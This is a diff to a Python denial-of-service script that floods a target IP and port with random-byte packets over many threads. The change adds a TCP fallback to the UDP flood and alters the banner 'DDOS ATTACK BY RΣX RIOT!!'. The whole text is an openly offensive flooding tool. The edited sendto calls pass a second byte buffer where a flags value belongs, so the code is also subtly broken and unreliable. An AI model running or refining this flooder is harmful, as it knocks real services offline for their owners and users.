@@ -27,26 +27,25 @@ time.sleep(1)
 
 def ppx():
   data = random._urandom(600)
+  datab = random._urandom(811)
   while True:
   	try:
   		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   		apa = (str(ip),int(port))
   		sock.connect((ip,port))
-  		sock.sendto(data,apa)
+  		sock.sendto(data,datab,apa)
   		for x in range(times):
-  			sock.sendto(data,apa)
+  			sock.sendto(data,datab,apa)
   		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
   	except:
-  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
-  while True:
-  	try:
+  		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   		sock.connect((ip,port))
-  		sock.sendto(data,apa)
+  		sock.sendto(data,datab,apa)
   		for x in range(times):
-  			sock.sendto(data,apa)
-  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
+  			sock.sendto(data,datab,apa)
+  		print("\033[1;36;40mATTACK BY \033[1;31;40mRΣX RIOT!!")
   	except:
-  		print("\033[1;36;40mDDOS ATTACK BY \033[1;31;40mRΣX RIOT!!")
+  		print("\033[1;36;40mATTACK BY \033[1;31;40mRΣX RIOT!!")
               
 for y in range(threads):
   rex = threading.Thread(target = ppx)
